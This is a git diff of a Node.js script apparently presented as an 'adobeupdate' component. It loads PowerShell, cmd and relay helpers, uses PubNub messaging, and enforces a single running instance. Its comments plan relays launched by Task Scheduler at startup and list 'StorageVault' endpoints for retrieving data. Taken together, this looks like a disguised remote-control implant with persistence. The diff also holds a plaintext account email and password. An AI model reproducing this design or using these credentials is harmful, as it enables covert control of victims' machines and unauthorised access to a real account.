@@ -1,38 +1,22 @@
-// 20260905
+// 20260909-1013
 
 debugger;
 
-//#region docuusersidmentation
-// https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
-// https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
-// https://onecompiler.com/nodejs#draft-yf7t
-
-// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui
-//
-// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ping.php
-// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/retrieve.php
-//
-
-// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
-// storagevault941@agentforce.com
-// As1df1gh!
-
-// --- TASKS LIST ---
-// ! one time setup:
-//   write userid to text file
-//   pcmon, psrelay , noderelay, pythonrelay --> these should all be kicked off
-//   by task scheduler at startup
-
-// ! implement reset mechanism in relays --> node relay --> clear session and start
-//   from scratch
-// ! need to filter out task, startup folder, reg startup launches --> we don't want the task launches to
-//   execute penetrate
-//#endregion
+/*
+    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui
+    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ping.php
+    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/retrieve.php
+    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
+    storagevault941@agentforce.com
+    As1df1gh!
+*/
 
 const helper = require("./adobeupdate.helper.js");
+const helper_web = require("./adobeupdate.helper.web.js");
 const helper_config = require("./adobeupdate.helper.config.js");
 const helper_ps = require("./adobeupdate.helper.ps.js");
 const helper_cmd = require("./adobeupdate.helper.cmd.js");
+const helper_relay = require("./adobeupdate.helper.relay.js");
 
 const path = require("path");
 const PubNub = require("pubnub");
@@ -43,10 +27,8 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-const ISDEBUG = true;
-
 function ensureSingleInstancePipe(initfunc) {
-    const PIPE_NAME = helper_config.systemconfig.lockfname;
+    const PIPE_NAME = helper_cmd.runningcmd.lockfname;
 
     helper.logmsg(`obtaining lock  ${PIPE_NAME}`);
 
@@ -74,14 +56,12 @@ function ensureSingleInstancePipe(initfunc) {
     });
 }
 
-let cmdarr = helper_ps.process_argv;
-let cmdarrstr = cmdarr ? cmdarr.join() : "";
+let cmdarrstr = helper_ps.getcmdarrstr();
+let statestr = helper_config.systemconfig.statestr;
 
-helper.logmsg(
-    `starting --  ${helper_config.systemconfig.statestr} -- ${cmdarrstr} -- scriptmd5=${helper_config.systemconfig.scriptmd5}`
-);
+helper.logmsgt(`starting --  ${statestr} ${cmdarrstr}`);
 
-ensureSingleInstancePipe(helper_cmd.cmdconfig.cmdfunc);
+ensureSingleInstancePipe(helper_cmd.runningcmd.cmdfunc);
 
 /*
 let clientjob = {
